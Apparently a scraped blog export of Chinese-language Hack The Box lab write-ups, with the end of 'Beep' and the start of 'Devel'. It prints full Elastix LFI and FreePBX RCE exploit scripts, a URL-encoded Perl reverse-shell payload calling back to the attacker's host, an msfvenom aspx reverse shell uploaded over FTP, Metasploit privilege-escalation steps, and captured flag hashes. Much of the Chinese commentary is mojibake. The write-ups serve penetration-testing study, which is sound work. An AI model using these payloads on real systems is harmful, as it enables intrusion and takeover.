tcpwrapped 3306/tcp open tcpwrapped |_sslv2: ERROR: Script execution failed (use -d to debug) Device type: firewall Running (JUST GUESSING): Fortinet embedded (87%) OS CPE: cpe:/h:fortinet:fortigate_100d Aggressive OS guesses: Fortinet FortiGate 100D firewall (87%) No exact OS matches for host (test conditions non-ideal). Network Distance: 4 hops Host script results: |_clock-skew: 59m55s TRACEROUTE (using port 8888/tcp) HOP RTT ADDRESS 1 5559.01 ms 10.10.16.1 2 ... 3 4 5559.05 ms 10.10.10.7 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 460.47 seconds Httpå…ˆæ¥çœ‹çœ‹80ç«¯å£çš„webæœåŠ¡ æ˜¯ä¸€ä¸ªElastixçš„ç³»ç»Ÿï¼Œå»æœæœçœ‹æ˜¯å¦æœ‰æ¼æ´ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# searchsploit elastix ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Elastix - &#39;page&#39; Cross-Site Scripting | php/webapps/38078.py Elastix - Multiple Cross-Site Scripting Vulnerabilities | php/webapps/38544.txt Elastix 2.0.2 - Multiple Cross-Site Scripting Vulnerabilities | php/webapps/34942.txt Elastix 2.2.0 - &#39;graph.php&#39; Local File Inclusion | php/webapps/37637.pl Elastix 2.x - Blind SQL Injection | php/webapps/36305.txt Elastix &lt; 2.5 - PHP Code Injection | php/webapps/38091.php FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution | php/webapps/18650.py ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰å‡ ä¸ªæ¼æ´ï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯LFIï¼ˆè¿œç¨‹æ–‡ä»¶åŒ…å«ï¼‰ï¼Œå»çœ‹çœ‹ç›¸å…³æ¼æ´å†…å®¹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# locate php/webapps/37637.pl /usr/share/exploitdb/exploits/php/webapps/37637.pl â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# cat /usr/share/exploitdb/exploits/php/webapps/37637.pl source: https://www.securityfocus.com/bid/55078/info Elastix is prone to a local file-include vulnerability because it fails to properly sanitize user-supplied input. An attacker can exploit this vulnerability to view files and execute local scripts in the context of the web server process. This may aid in further attacks. Elastix 2.2.0 is vulnerable; other versions may also be affected. #!/usr/bin/perl -w #------------------------------------------------------------------------------------# #Elastix is an Open Source Sofware to establish Unified Communications. #About this concept, Elastix goal is to incorporate all the communication alternatives, #available at an enterprise level, into a unique solution. #------------------------------------------------------------------------------------# ############################################################ # Exploit Title: Elastix 2.2.0 LFI # Google Dork: :( # Author: cheki # Version:Elastix 2.2.0 # Tested on: multiple # CVE : notyet # romanc-_-eyes ;) # Discovered by romanc-_-eyes # vendor http://www.elastix.org/ print &quot;\\t Elastix 2.2.0 LFI Exploit \\n&quot;; print &quot;\\t code author cheki \\n&quot;; print &quot;\\t 0day Elastix 2.2.0 \\n&quot;; print &quot;\\t email: anonymous17hacker{}gmail.com \\n&quot;; #LFI Exploit: /vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action use LWP::UserAgent; print &quot;\\n Target: https://ip &quot;; chomp(my $target=&lt;STDIN&gt;); $dir=&quot;vtigercrm&quot;; $poc=&quot;current_language&quot;; $etc=&quot;etc&quot;; $jump=&quot;../../../../../../../..//&quot;; $test=&quot;amportal.conf%00&quot;; $code = LWP::UserAgent-&gt;new() or die &quot;inicializacia brauzeris\\n&quot;; $code-&gt;agent(&#39;Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)&#39;); $host = $target . &quot;/&quot;.$dir.&quot;/graph.php?&quot;.$poc.&quot;=&quot;.$jump.&quot;&quot;.$etc.&quot;/&quot;.$test.&quot;&amp;module=Accounts&amp;action&quot;; $res = $code-&gt;request(HTTP::Request-&gt;new(GET=&gt;$host)); $answer = $res-&gt;content; if ($answer =~ &#39;This file is part of FreePBX&#39;) { print &quot;\\n read amportal.conf file : $answer \\n\\n&quot;; print &quot; successful read\\n&quot;; } else { print &quot;\\n[-] not successful\\n&quot;; } æ¼æ´åˆ©ç”¨æ ¹æ®Exploitä¸­æåˆ°çš„ï¼Œæ„é€ ä¸€ä¸ªä»»æ„æ–‡ä»¶è¯»å–çš„Payload view-source:https://10.10.10.7/vtigercrm/graph.php?current_language=../../../../../../../..//etc/amportal.conf%00&amp;module=Accounts&amp;action æˆåŠŸè¯»å–åˆ°ä¸€ä¸ªè´¦å·å¯†ç  username = admin password = jEhdIekWmdjE æˆ‘ä»¬å»å°è¯•ç™»å½•ä¸€ä¸‹ ç™»å…¥åä¼¼ä¹æ˜¯ä¸€ä¸ªä»ªè¡¨ç›˜ï¼Œä½†æ²¡ä»€ä¹ˆå¯ä»¥åˆ©ç”¨çš„ ç»è¿‡å°è¯•åå‘ç°&#x2F;adminç›®å½•æ˜¯ä¸€ä¸ªå¦å¤–çš„ç™»å½•å£ï¼Œä¹Ÿå¯ä½¿ç”¨è¿™ä¸ªè´¦å·å¯†ç è¿›è¡Œç™»å½• ä½†ç™»å…¥åä¹Ÿæ²¡çœ‹åˆ°ä»€ä¹ˆæ˜æ˜¾çš„åˆ©ç”¨ç‚¹ è¿™è¾¹å€’æ˜¯å¯ä»¥ç›´æ¥ä½¿ç”¨sshè¿›è¡Œç™»å½•ï¼Œå…ˆç»™å¤§å®¶æ¼”ç¤ºä¸€ä¸‹ç›´æ¥ç™»å½•çš„æ–¹æ³•ï¼Œå†æ¼”ç¤ºå…¶ä»–çš„åˆ©ç”¨æ–¹å¼ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh root@10.10.10.7 Unable to negotiate with 10.10.10.7 port 22: no matching key exchange method found. Their offer: diffie-hellman-group-exchange-sha1,diffie-hellman-group14-sha1,diffie-hellman-group1-sha1 è¿™è¾¹æç¤ºéœ€è¦æŒ‡å®škexç®—æ³•ï¼Œå»æŒ‡å®šä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ssh root@10.10.10.7 -o KexAlgorithms=diffie-hellman-group1-sha1 255 â¨¯ The authenticity of host &#39;10.10.10.7 (10.10.10.7)&#39; can&#39;t be established. RSA key fingerprint is SHA256:Ip2MswIVDX1AIEPoLiHsMFfdg1pEJ0XXD5nFEjki/hI. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added &#39;10.10.10.7&#39; (RSA) to the list of known hosts. root@10.10.10.7&#39;s password: Last login: Tue Jul 16 11:45:47 2019 Welcome to Elastix ---------------------------------------------------- To access your Elastix System, using a separate workstation (PC/MAC/Linux) Open the Internet Browser using the following URL: http://10.10.10.7 [root@beep ~]# whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) å¯ä»¥ç›´æ¥ä½¿ç”¨ç½‘é¡µä¸­è·å–åˆ°çš„å¯†ç è¿›è¡Œç™»å½•ï¼Œä¸è¿‡è¿™ç§çŒœå¯†ç æ˜¯å¦å¯ä»¥åˆ©ç”¨çš„æ–¹å¼æ˜¾ç„¶ä¸ç¬¦åˆæˆ‘çš„æƒ³æ³•ï¼Œè¿˜æ˜¯å¾—æµ‹è¯•æ¼æ´ è¿›å…¥https://10.10.10.7/adminç„¶åå–æ¶ˆç™»å½•æ¡†ï¼Œå³å¯çœ‹åˆ°FreePBXçš„ç‰ˆæœ¬ï¼Œå»searchspolitä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# searchsploit FreePBX ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Exploit Title | Path ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- FreePBX - &#39;config.php&#39; Remote Code Execution (Metasploit) | unix/remote/32512.rb FreePBX 13 - Remote Command Execution / Privilege Escalation | php/webapps/40614.py FreePBX 13.0.35 - Remote Command Execution | php/webapps/40296.txt FreePBX 13.0.35 - SQL Injection | php/webapps/40312.txt FreePBX 13.0.x &lt; 13.0.154 - Remote Command Execution | php/webapps/40345.txt FreePBX 13/14 - Remote Command Execution / Privilege Escalation | linux/remote/40232.py FreePBX 2.1.3 - &#39;upgrade.php&#39; Remote File Inclusion | php/webapps/2665.txt FreePBX 2.10.0 / Elastix 2.2.0 - Remote Code Execution | php/webapps/18650.py FreePBX 2.11.0 - Remote Command Execution | php/webapps/32214.pl FreePBX 2.2 - SIP Packet Multiple HTML Injection Vulnerabilities | multiple/remote/29873.php FreePBX 2.5.1 - SQL Injection | multiple/webapps/11186.txt FreePBX 2.5.2 - &#39;/admin/config.php?tech&#39; Cross-Site Scripting | php/webapps/33442.txt FreePBX 2.5.2 - Zap Channel Addition Description Parameter Cross-Site Scripting | php/webapps/33443.txt FreePBX 2.5.x - Information Disclosure | multiple/webapps/11187.txt FreePBX 2.5.x &lt; 2.6.0 - Persistent Cross-Site Scripting | multiple/webapps/11184.txt FreePBX 2.8.0 - Recordings Interface Allows Remote Code Execution | php/webapps/15098.txt FreePBX 2.9.0/2.10.0 - &#39;callmenum&#39; Remote Code Execution (Metasploit) | php/webapps/18659.rb FreePBX 2.9.0/2.10.0 - Multiple Vulnerabilities | php/webapps/18649.txt FreePBX &lt; 13.0.188 - Remote Command Execution (Metasploit) | php/remote/40434.rb Freepbx &lt; 2.11.1.5 - Remote Code Execution | php/webapps/41005.txt ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- --------------------------------- Shellcodes: No Results è¿™é‡Œå¯ä»¥çœ‹åˆ°æœ‰ä¸€ä¸ªRCEçš„æ¼æ´ php&#x2F;webapps&#x2F;18650.py å’±ä»¬å»æŸ¥çœ‹ä¸€ä¸‹ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Beep] â””â”€# cat exploit.py #!/usr/bin/python ############################################################ # Exploit Title: FreePBX / Elastix pre-authenticated remote code execution exploit # Google Dork: oy vey # Date: March 23rd, 2012 # Author: muts # Version: FreePBX 2.10.0/ 2.9.0, Elastix 2.2.0, possibly others. # Tested on: multiple # CVE : notyet # Blog post : http://www.offensive-security.com/vulndev/freepbx-exploit-phone-home/ # Archive Url : http://www.offensive-security.com/0day/freepbx_callmenum.py.txt ############################################################ # Discovered by Martin Tschirsich # http://seclists.org/fulldisclosure/2012/Mar/234 # http://www.exploit-db.com/exploits/18649 ############################################################ import urllib rhost=&quot;172.16.254.72&quot; lhost=&quot;172.16.254.223&quot; lport=443 extension=&quot;1000&quot; # Reverse shell payload url = &#39;https://&#39;+str(rhost)+&#39;/recordings/misc/callme_page.php?action=c&amp;callmenum=&#39;+str(extension)+&#39;@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%22&#39;+str(lhost)+&#39;%3a&#39;+str(lport)+&#39;%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A&#39; urllib.urlopen(url) # On Elastix, once we have a shell, we can escalate to root: # root@bt:~# nc -lvp 443 # listening on [any] 443 ... # connect to [172.16.254.223] from voip [172.16.254.72] 43415 # id # uid=100(asterisk) gid=101(asterisk) # sudo nmap --interactive # Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ ) # Welcome to Interactive Mode -- press h &lt;enter&gt; for help # nmap&gt; !sh # id # uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) ç¨å¾®åšä¸€ä¸‹ä¿®æ”¹ rhost=&quot;10.10.10.7&quot; lhost=&quot;10.10.16.2&quot; lport=4444 extension=&quot;1000&quot; ä¿®æ”¹å¥½ä»¥åå»æ‰§è¡Œè¯•è¯• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Beep] â””â”€# python exploit.py Traceback (most recent call last): File &quot;exploit.py&quot;, line 27, in &lt;module&gt; urllib.urlopen(url) File &quot;/usr/lib/python2.7/urllib.py&quot;, line 87, in urlopen return opener.open(url) File &quot;/usr/lib/python2.7/urllib.py&quot;, line 215, in open return getattr(self, name)(url) File &quot;/usr/lib/python2.7/urllib.py&quot;, line 445, in open_https h.endheaders(data) File &quot;/usr/lib/python2.7/httplib.py&quot;, line 1078, in endheaders self._send_output(message_body) File &quot;/usr/lib/python2.7/httplib.py&quot;, line 894, in _send_output self.send(msg) File &quot;/usr/lib/python2.7/httplib.py&quot;, line 856, in send self.connect() File &quot;/usr/lib/python2.7/httplib.py&quot;, line 1303, in connect server_hostname=server_hostname) File &quot;/usr/lib/python2.7/ssl.py&quot;, line 369, in wrap_socket _context=self) File &quot;/usr/lib/python2.7/ssl.py&quot;, line 599, in __init__ self.do_handshake() File &quot;/usr/lib/python2.7/ssl.py&quot;, line 828, in do_handshake self._sslobj.do_handshake() IOError: [Errno socket error] [SSL: UNSUPPORTED_PROTOCOL] unsupported protocol (_ssl.c:727) è¿™è¾¹urllibæŠ¥é”™äº†ï¼Œæƒ³ä¸ªåŠæ³•ï¼Œç»™åˆ æ‰æ”¹æˆprintè¾“å‡ºæ‰‹åŠ¨æ‰§è¡Œè¯•è¯• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Beep] â””â”€# python exploit.py https://10.10.10.7/recordings/misc/callme_page.php?action=c&amp;callmenum=1000@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.2%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A å»æµè§ˆå™¨é‡Œè®¿é—®ä¸€ä¸‹ å»è®¿é—®åè¿™ä¸€æ®µæ²¡æœ‰å¼¹å›shellï¼Œå»æ‰¾ä¸€ä¸‹åŸå›  æ’æŸ¥åå‘ç°åº”è¯¥æ˜¯extensionçš„é—®é¢˜ï¼Œå»æŸ¥æ‰¾ä¸€ä¸‹æ­£ç¡®çš„extension â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# svwar -m INVITE -e200-300 10.10.10.7 WARNING:TakeASip:using an INVITE scan on an endpoint (i.e. SIP phone) may cause it to ring and wake up people in the middle of the night ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag WARNING:TakeASip:extension &#39;239&#39; probably exists but the response is unexpected WARNING:TakeASip:extension &#39;241&#39; probably exists but the response is unexpected ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag ERROR:TakeASip:could not decode to tag +-----------+----------------+ | Extension | Authentication | +===========+================+ | 233 | reqauth | +-----------+----------------+ | 239 | weird | +-----------+----------------+ | 241 | weird | +-----------+----------------+ æ­£ç¡®çš„æ˜¯233ï¼Œå’±ä»¬å»exploité‡Œä¿®æ”¹ä¸€ä¸‹ï¼Œç„¶åé‡æ–°ç”Ÿæˆ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Beep] â””â”€# python exploit.py https://10.10.10.7/recordings/misc/callme_page.php?action=c&amp;callmenum=233@from-internal/n%0D%0AApplication:%20system%0D%0AData:%20perl%20-MIO%20-e%20%27%24p%3dfork%3bexit%2cif%28%24p%29%3b%24c%3dnew%20IO%3a%3aSocket%3a%3aINET%28PeerAddr%2c%2210.10.16.2%3a4444%22%29%3bSTDIN-%3efdopen%28%24c%2cr%29%3b%24%7e-%3efdopen%28%24c%2cw%29%3bsystem%24%5f%20while%3c%3e%3b%27%0D%0A%0D%0A å†å»è¯•è¯• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# nc -nvlp 4444 listening on [any] 4444 ... connect to [10.10.16.3] from (UNKNOWN) [10.10.10.7] 46340 python -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot; bash-3.2$ whoami&amp;&amp;id whoami&amp;&amp;id asterisk uid=100(asterisk) gid=101(asterisk) æˆåŠŸæ‹¿åˆ°useræƒé™ bash-3.2$ cd /home cd /home bash-3.2$ ls ls fanis spamfilter bash-3.2$ cd fanis cd fanis bash-3.2$ ls ls user.txt bash-3.2$ cat user.txt cat user.txt e6da504f44f4d004da91498eec298b24 æˆåŠŸæ‹¿åˆ°useræƒé™çš„flagæ–‡ä»¶ æƒé™æå‡# On Elastix, once we have a shell, we can escalate to root: # root@bt:~# nc -lvp 443 # listening on [any] 443 ... # connect to [172.16.254.223] from voip [172.16.254.72] 43415 # id # uid=100(asterisk) gid=101(asterisk) # sudo nmap --interactive # Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ ) # Welcome to Interactive Mode -- press h &lt;enter&gt; for help # nmap&gt; !sh # id # uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) æŒ‰ç…§exploité‡Œæç¤ºçš„è¿›è¡Œææƒè¯•è¯• bash-3.2$ sudo nmap --interactive sudo nmap --interactive Starting Nmap V. 4.11 ( http://www.insecure.org/nmap/ ) Welcome to Interactive Mode -- press h &lt;enter&gt; for help nmap&gt; !sh !sh sh-3.2# whoami&amp;&amp;id whoami&amp;&amp;id root uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel) æˆåŠŸæ‹¿åˆ°rootæƒé™ sh-3.2# cd /root cd /root sh-3.2# ls ls anaconda-ks.cfg install.log.syslog webmin-1.570-1.noarch.rpm elastix-pr-2.2-1.i386.rpm postnochroot install.log root.txt sh-3.2# cat root.txt cat root.txt 493be6af70ce6780ee96432618649fe4 æˆåŠŸæ‹¿åˆ°rootæƒé™çš„flagæ–‡ä»¶ å’±ä»¬çœ‹ä¸€ä¸‹åŸç† sh-3.2# sudo -l sudo -l Matching Defaults entries for root on this host: env_reset, env_keep=&quot;COLORS DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES LC_MONETARY LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&quot; User root may run the following commands on this host: (ALL) ALL è¿™é‡Œå¯ä»¥æ‰§è¡Œçš„æƒé™è¿˜æŒºå¤šçš„","categories":[],"tags":[{"name":"Hackthebox","slug":"Hackthebox","permalink":"http://www.lucifiel.com/tags/Hackthebox/"}]},{"title":"Devel - Hackthebox","slug":"Hackthebox - Devel","date":"2022-03-03T11:38:36.000Z","updated":"2023-05-20T01:31:37.000Z","comments":true,"path":"2022/03/03/Hackthebox - Devel/","link":"","permalink":"http://www.lucifiel.com/2022/03/03/Hackthebox%20-%20Devel/","excerpt":"","text":"Hackthebox - Develé¶åœºä¿¡æ¯ é¶åœºç±»å‹ ä¿¡æ¯æœé›†Nmapâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Devel] â””â”€# nmap -sS -A -sC -sV -p- --min-rate 5000 10.10.10.5 130 â¨¯ Starting Nmap 7.91 ( https://nmap.org ) at 2022-03-03 02:16 EST Nmap scan report for 10.10.10.5 Host is up (0.70s latency). Not shown: 65533 filtered ports PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd | ftp-anon: Anonymous FTP login allowed (FTP code 230) | 03-18-17 01:06AM &lt;DIR&gt; aspnet_client | 03-17-17 04:37PM 689 iisstart.htm |_03-17-17 04:37PM 184946 welcome.png | ftp-syst: |_ SYST: Windows_NT 80/tcp open http Microsoft IIS httpd 7.5 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/7.5 |_http-title: IIS7 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|phone|specialized Running (JUST GUESSING): Microsoft Windows 2008|7|Vista|Phone|8.1|2012 (91%) OS CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1 cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_server_2012:r2 Aggressive OS guesses: Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows Vista SP0 or SP1, Windows Server 2008 SP1, or Windows 7 (91%), Microsoft Windows Vista SP2, Windows 7 SP1, or Windows Server 2008 (90%), Microsoft Windows 8.1 Update 1 (90%), Microsoft Windows Phone 7.5 or 8.0 (90%), Microsoft Windows Server 2008 R2 (90%), Microsoft Windows Server 2008 R2 or Windows 8.1 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (90%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (90%) No exact OS matches for host (test conditions non-ideal). Network Distance: 2 hops Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows TRACEROUTE (using port 80/tcp) HOP RTT ADDRESS 1 934.01 ms 10.10.16.1 2 934.05 ms 10.10.10.5 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 64.29 seconds Httpå…ˆå»çœ‹çœ‹80ç«¯å£çš„webæœåŠ¡ å°±æ˜¯ä¸€ä¸ªæ™®é€šçš„IISé¡µé¢ï¼Œæ²¡ä»€ä¹ˆå¯çœ‹çš„ FTPFTPå¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ªæ–‡ä»¶ï¼Œå¹¶ä¸”å¯ä»¥åŒ¿åç™»å½• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Devel] â””â”€# ftp 10.10.10.5 Connected to 10.10.10.5. 220 Microsoft FTP Service Name (10.10.10.5:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&gt; dir 200 PORT command successful. 125 Data connection already open; Transfer starting. 03-18-17 01:06AM &lt;DIR&gt; aspnet_client 03-17-17 04:37PM 689 iisstart.htm 03-17-17 04:37PM 184946 welcome.png 226 Transfer complete. è¿™é‡Œçœ‹åˆ°ä¸¤ä¸ªæ–‡ä»¶ï¼Œä¼¼ä¹å’Œ80ç«¯å£çš„æ˜¯ä¸€æ ·çš„ å»æœ¬åœ°åˆ›å»ºä¸ªæ–‡ä»¶ä¼ ä¸Šå»è¯•è¯• â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# echo &quot;I&#39;m Lucifiel&quot; &gt; test.html â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ftp 10.10.10.5 Connected to 10.10.10.5. 220 Microsoft FTP Service Name (10.10.10.5:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&gt; put test.html local: test.html remote: test.html 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 14 bytes sent in 0.00 secs (303.8194 kB/s) ftp&gt; ls 200 PORT command successful. 125 Data connection already open; Transfer starting. 03-18-17 01:06AM &lt;DIR&gt; aspnet_client 03-17-17 04:37PM 689 iisstart.htm 03-03-22 09:29AM 14 test.html 03-17-17 04:37PM 184946 welcome.png 226 Transfer complete. æˆåŠŸä¼ ä¸Šå»äº†ï¼Œå’±ä»¬å»è®¿é—®çœ‹çœ‹æœ‰æ²¡æœ‰ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# curl http://10.10.10.5/test.html I&#39;m Lucifiel OKï¼Œä¼ ä¸Šå»äº†ï¼Œè¯æ˜çŒœæƒ³æ²¡é”™ï¼Œé‚£å°±ç®€å•äº†ï¼Œå»ç”Ÿæˆä¸ªé©¬ä¼ ä¸Šå»å§ æ¼æ´åˆ©ç”¨â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.16.2 LPORT=4444 -f aspx -o shell.aspx [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload [-] No arch selected, selecting arch: x86 from the payload No encoder specified, outputting raw payload Payload size: 354 bytes Final size of aspx file: 2901 bytes Saved as: shell.aspx ä½¿ç”¨msfç”Ÿæˆä¸€ä¸ªaspxçš„æœ¨é©¬ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop] â””â”€# ftp 10.10.10.5 Connected to 10.10.10.5. 220 Microsoft FTP Service Name (10.10.10.5:root): anonymous 331 Anonymous access allowed, send identity (e-mail name) as password. Password: 230 User logged in. Remote system type is Windows_NT. ftp&gt; put shell.aspx local: shell.aspx remote: shell.aspx 200 PORT command successful. 125 Data connection already open; Transfer starting. 226 Transfer complete. 2938 bytes sent in 0.00 secs (58.3728 MB/s) ç„¶åä½¿ç”¨ftpä¼ ä¸Šå» msf6 &gt; set payload windows/meterpreter/reverse_tcp payload =&gt; windows/meterpreter/reverse_tcp msf6 &gt; use exploit/multi/handler [*] Using configured payload windows/meterpreter/reverse_tcp msf6 exploit(multi/handler) &gt; set lhost 10.10.16.2 lhost =&gt; 10.10.16.2 msf6 exploit(multi/handler) &gt; set lport 4444 lport =&gt; 4444 msf6 exploit(multi/handler) &gt; exploit [*] Started reverse TCP handler on 10.10.16.2:4444 ç„¶åä½¿ç”¨msfå¼€å¯ç«¯å£ç›‘å¬ â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/HTB/Easy/Devel] â””â”€# curl http://10.10.10.5/shell.aspx ç„¶åè®¿é—®æˆ‘ä»¬ä¸Šä¼ çš„aspxé©¬ msf6 exploit(multi/handler) &gt; exploit [*] Started reverse TCP handler on 10.10.16.2:4444 [*] Sending stage (175174 bytes) to 10.10.10.5 [*] Meterpreter session 1 opened (10.10.16.2:4444 -&gt; 10.10.10.5:49162) at 2022-03-03 02:37:15 -0500 meterpreter &gt; getuid Server username: IIS APPPOOL\\Web meterpreter &gt; sysinfo Computer : DEVEL OS : Windows 7 (6.1 Build 7600). Architecture : x86 System Language : el_GR Domain : HTB Logged On Users : 2 Meterpreter : x86/windows æˆåŠŸæ‹¿åˆ°shell æƒé™æå‡meterpreter &gt; background [*] Backgrounding session 1... msf6 exploit(multi/handler) &gt; use post/multi/recon/local_exploit_suggester [*] Using configured payload windows/meterpreter/reverse_tcp msf6 post(multi/recon/local_exploit_suggester) &gt; set session 1 session =&gt; 1 msf6 post(multi/recon/local_exploit_suggester) &gt; exploit [*] 10.10.10.5 - Collecting local exploits for x86/windows... [*] 10.10.10.5 - 38 exploit checks are being tried... [+] 10.10.10.5 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms16_032_secondary_logon_handle_privesc: The service is running, but could not be validated. [+] 10.10.10.5 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable. [+] 10.10.10.5 - exploit/windows/local/tokenmagic: The target appears to be vulnerable. [*] Post module execution completed ä½¿ç”¨post&#x2F;multi&#x2F;recon&#x2F;local_exploit_suggesterä½œä¸ºææƒè¾…åŠ©è„šæœ¬ è¿™é‡Œæµ‹è¯•å‡ºæ¥å¯ä»¥ä½¿ç”¨çš„ææƒexpæŒºå¤šçš„ï¼Œæˆ‘ä»¬å°±æ‹¿ç¬¬ä¸€ä¸ªå§ use exploit/windows/local/ms10_015_kitrap0d set session 1 set lhost 10.10.16.2 msf6 exploit(windows/local/ms10_015_kitrap0d) &gt; show options Module options (exploit/windows/local/ms10_015_kitrap0d): Name Current Setting Required Description ---- --------------- -------- ----------- SESSION 1 yes The session to run this module on. Payload options (windows/meterpreter/reverse_tcp): Name Current Setting Required Description ---- --------------- -------- ----------- EXITFUNC process yes Exit technique (Accepted: &#39;&#39;, seh, thread, 